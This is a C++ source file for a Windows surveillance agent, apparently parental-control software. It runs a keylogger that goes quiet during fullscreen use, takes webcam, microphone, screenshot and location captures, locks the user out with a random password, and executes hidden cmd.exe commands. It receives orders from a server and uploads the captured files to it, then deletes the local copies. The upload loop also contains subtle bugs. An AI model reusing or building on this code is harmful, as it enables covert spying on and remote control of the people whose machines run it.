#include "TaskRoutines.h"
#include <mutex>

HANDLE camRequest, micRequest, lockRequest, cmdRequest, locationRequest, screenRequest, newDataEvent;
map<string, BOOL> workingTasks;

std::mutex buff_mutex;

DWORD WINAPI initFiltering(LPVOID lpParam)
{
//	snitchServer();
	return 0;
}
DWORD WINAPI initKeylogger(LPVOID lpParam)
{
	while (TRUE) { 
		QUERY_USER_NOTIFICATION_STATE pquns;
		SHQueryUserNotificationState(&pquns);

		// Determine a fullscreen state
		if (pquns == QUNS_BUSY || pquns == QUNS_RUNNING_D3D_FULL_SCREEN) 
		{
			// User in fullscreen mode
			// Go to sleep until its over 0_0
			Sleep(SYNC_TIME);
			continue;
		}
		// Filename changes every { num_seconds } declared in the keylogger.cpp file 

		string filename = constructFilename(TEMP_CODE);
		wstring filenameW = stringToWString(filename);

		// Start keylogger
		keylogger(filenameW.c_str());

		string finalFilename = constructFilename(KEYLOG_CODE);
		wstring finalFilenameW = stringToWString(finalFilename);
		string path = DATA_FOLDER_PATH;

		int res = -1;
		do 
			res = rename(path.append(filename).c_str(), path.append(finalFilename).c_str());
		while (res != 0);

		// Notifiy data manager thread
		SetEvent(newDataEvent);
	}
	return 0;
}
DWORD WINAPI initScreenshot(LPVOID lpParam)
{
	do {
		screenRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("screen"));
	} while (screenRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			screenRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(screenRequest);
		// Request Arrived..
		// Read screenshots request from disk
		wstring filename = stringToWString(constructFilename(SCREENSHOT_CODE));
		// Start capturing
		screenCapture(0, 0, 1920, 1080, filename.c_str());
		// Notifiy data manager thread
		SetEvent(newDataEvent);
		return 1;
	}
	return 0;
}
DWORD WINAPI initCamera(LPVOID lpParam)
{
	do {
		camRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("cam"));
	} while (camRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			camRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(camRequest);
		// Request Arrived..
		// Read camera request from disk

		string filename = constructFilename(CAMERA_CODE);
		// Take a picture
		camera(filename.c_str());
		// Notifiy data manager thread
		SetEvent(newDataEvent);
	}
	return 0;
}
DWORD WINAPI initMic(LPVOID lpParam)
{
	do {
		micRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("mic"));
	} while (micRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			micRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(micRequest);
		// Request Arrived..
		// Read mic request from disk
		
		string filename = constructFilename(AUDIO_CODE);
		// Record for 10 seconds
		recordAudio(10, filename.c_str()); 
		// Notifiy data manager thread
		SetEvent(newDataEvent);
	}
	return 0;
}
DWORD WINAPI initRemoteLockdown(LPVOID lpParam)
{
	do {
		lockRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("lock"));
	} while (lockRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			lockRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(lockRequest);
		// Request Arrived..
		// Read lock request from disk
		char* newPassword = generateRandomPass();
		// TODO: Send the new password to parent account
		wchar_t wPassword[PASSWORD_LEN];
		mbstowcs(wPassword, newPassword, strlen(newPassword) + 1);
		BOOL success = lockUser(wPassword);
	}
	return 0;
}
DWORD WINAPI initRemoteCommands(LPVOID lpParam)
{
	do {
		cmdRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("cmd"));
	} while (cmdRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			cmdRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(cmdRequest);
		// Request Arrived..
		
		// Read cmd request from disk
		LPCWSTR cmd = L"ipconfig";
		
		// Output to a new file
		LPCWSTR o_cmd = L" > ";

		// Get a new filename
		wstring filename = stringToWString(constructFilename(CMD_CODE));
		
		// Construct the full command
		wstring stdResult = wstring(cmd) + o_cmd + filename; 
		LPCWSTR final_cmd = stdResult.c_str();
		ShellExecute(0, L"open", L"cmd.exe", final_cmd, 0, SW_HIDE);

		// Notifiy data manager thread
		SetEvent(newDataEvent);
	}
	return 0;
}

DWORD WINAPI initLocationTracker(LPVOID lpParam) {
	do {
		locationRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("location"));
	} while (locationRequest == NULL);

	while (TRUE) {
		WaitForSingleObject(
			locationRequest, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(locationRequest);

		wstring filename = stringToWString(constructFilename(LOCATION_CODE));

		getLocation(filename.c_str());
		SetEvent(newDataEvent);
	}
	return 0;
}

DWORD WINAPI initDataManager(LPVOID lpParam)
{
	do {
		newDataEvent = CreateEvent(NULL, TRUE, FALSE, TEXT("data"));
	} while (newDataEvent == NULL);
	while (TRUE) {
		WaitForSingleObject(
			newDataEvent, // event handle
			INFINITE);    // indefinite wait
		ResetEvent(newDataEvent);
		// New data to send 
		WIN32_FIND_DATA data, currentData;
		HANDLE hFind = FindFirstFile(L"temp/*", &data);
		priority_queue<WIN32_FIND_DATA, vector<WIN32_FIND_DATA>, CompareDates> uploadQueue;

		if (hFind != INVALID_HANDLE_VALUE) {
			do // Look for new files in temp folder and insert each of them to a priority queue (sorted by date).
				if(wcslen(data.cFileName) > 3)
					uploadQueue.push(data);
			while (FindNextFile(hFind, &data));
			FindClose(hFind);
		} 
		while (!uploadQueue.empty()) {
			// Get the first file in the queue
			currentData = uploadQueue.top();
			char filename[256];
			// Convert wchar* to char*
			wstring ws(data.cFileName);
			wcstombs(filename, ws.c_str(), 256);

			// Create json data corresponding to the current file

			string dataType = checkDataType(filename);
			if (dataType == UNDEFINED_CODE)
				continue; // File not recognized

			map<string, string> currentJsonItem{
				  make_pair("dataType", dataType)
			};
			string json = jsonFromItem(currentJsonItem, DATA);

			buff_mutex.lock();
			while (uploadFile(filename, (char*)json.c_str()).dwStatusCode != 200) {
				buff_mutex.unlock();
				Sleep(SYNC_TIME);
			}

			// Remove the file from temp folder after successfully uploading it	  
			wstring wfilename(data.cFileName);
			wstring concatted_stdstr = L"temp/" + wfilename;
			LPCWSTR fullPath = concatted_stdstr.c_str();
			
			if (workingTasks.find(dataType) != workingTasks.end())
				workingTasks.erase(dataType);
			buff_mutex.unlock();

			DeleteFile(fullPath);
			// Remove from the queue
			uploadQueue.pop();
		}
	}
	return 0;
}

DWORD WINAPI initRequestManager(LPVOID lpParam)
{
	// Retreive events from the server.
	// Signal event for current request. E.g. camera
	 
	while (TRUE) {
		// Look for new requests from server..
		ResponseData requests; 
		buff_mutex.lock();
		while (TRUE) {
			requests = downloadFile();
			if (requests.dwStatusCode != 200 || requests.response == "[]")
				Sleep(SYNC_TIME);
			else
				break;
		}
		// Convert the response to map or requests.
		map<string, map<string, string>> allRequests = itemsListFromJson(requests.response);
		map<string, string> myResponse;
		   
		for (int i = 0; i < allRequests.size(); i++)
		{
			initRequest(allRequests, Camera, camRequest);
			initRequest(allRequests, Audio, micRequest);
			initRequest(allRequests, Screenshot, screenRequest);
			initRequest(allRequests, Lockdown, lockRequest);
			initRequest(allRequests, Command, cmdRequest);
			initRequest(allRequests, Location, locationRequest);
		}
		buff_mutex.unlock();
		Sleep(SYNC_TIME);
	}
	return 0;
}

BOOL initRequest(map<string, map<string, string>> allRequests, const char* requestName, HANDLE requestHandle) {
	map<string, map<string, string>>::iterator allRequestsIterator;
	map<string, string> currentRequest;
	map<string, string>::iterator requestIterator;

	allRequestsIterator = allRequests.find(requestName);
	if (allRequestsIterator == allRequests.end())
		return FALSE;

	currentRequest = allRequestsIterator->second;
	requestIterator = currentRequest.find(DATA_TYPE);

	map<string, BOOL>::iterator tasksIter = workingTasks.find(requestName);
	if (tasksIter == workingTasks.end()) {
		//If the task is new, register it in the map ..
		workingTasks.insert(make_pair(requestIterator->second, TRUE));
	}
	else { // The task was found in the map ..
		return FALSE; // Task already running, no need to call it again ..
	}
	// else call the requested task 
	if (requestHandle != NULL && requestIterator != currentRequest.end())
	{	
		SetEvent(requestHandle);
		return TRUE; 
	} 
	return FALSE;
}

string checkDataType(char* filename)
{
	const char id[3] = { filename[0],filename[1] , '\0' };

	if (!strcmp(id, KEYLOG_CODE))
		return Keylog;
	else if (!strcmp(id, CAMERA_CODE))
		return Camera;
	else if (!strcmp(id, AUDIO_CODE))
		return Audio;
	else if (!strcmp(id, SCREENSHOT_CODE))
		return Screenshot;
	else if (!strcmp(id, CMD_CODE))
		return Command;
	else if (!strcmp(id, LOCATION_CODE))
		return Location;
	return UNDEFINED_CODE;
}
string getRandomString(const int len) {
	const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	string tmp_s;
	tmp_s.reserve(len);

	for (int i = 0; i < len; ++i) {
		tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];
	}
	return tmp_s;
}

string constructFilename(const char* typeCode) {
	// Get time and date
	time_t rawtime;
	struct tm* timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	char dateString[80];

	// Get the date as a string
	strftime(dateString, sizeof(dateString), "-%d-%m-%Y-%H-%M-%S-", timeinfo);
	string fname = "";
	fname.append(DATA_FOLDER_PATH).append(typeCode).append(dateString).append(getRandomString(10));
	return fname;
}

wstring stringToWString(string str) {
	return wstring(str.begin(), str.end());
}